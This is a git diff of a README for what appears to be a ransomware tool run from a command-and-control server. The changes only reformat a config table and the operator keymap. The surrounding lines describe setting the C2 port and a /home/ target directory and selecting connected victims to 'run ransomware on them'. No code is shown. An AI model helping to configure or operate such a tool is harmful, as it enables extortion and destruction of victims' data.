@@ -56,6 +56,8 @@ In the target directory you can see a file called config.py. This file contains 
 | PORT        | The port of the c2 server                                                       | 8080      |
 | TARGET_DIR  | The first directory that will be recursed through for ransom                    | /home/    |
 | BINARY_NAME | The output binary name                                                          | /example/ |
+| ----------- | ------------------------------------------------------------------------------- | --------- |
+
 Ensure these configs are set how you want before building into a executable.
 
 ### Building
@@ -91,10 +93,10 @@ python3 main.py
 ```
 
 ### Keymaps
-`l` - List active connections
-* In this menu select your target by pressing the corresponding number
-`r` - Ransomware option
-* When a target/targets is selected run ransomware on them
+`l` - List active connections <br>
+* In this menu select your target by pressing the corresponding number <br>
+`r` - Ransomware option <br>
+* When a target/targets is selected run ransomware on them <br>
 `t` - List active targets <br>
 `q` - Quit <br>
 `b` - Goes back in all menus <br>
